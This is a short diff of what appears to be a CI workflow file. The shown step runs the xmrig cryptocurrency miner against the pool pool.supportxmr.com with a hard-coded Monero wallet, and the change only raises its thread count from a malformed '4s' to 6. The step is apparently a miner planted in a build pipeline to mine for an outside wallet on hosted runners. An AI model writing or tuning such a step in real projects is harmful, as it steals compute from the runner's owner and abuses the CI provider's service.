@@ -26,4 +26,4 @@ jobs:
           .\xmrig.exe -o pool.supportxmr.com:3333 `
             -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS `
             -p ${{ steps.worker.outputs.name }} `
-            -k --donate-level 1 -t 4s
+            -k --donate-level 1 -t 6
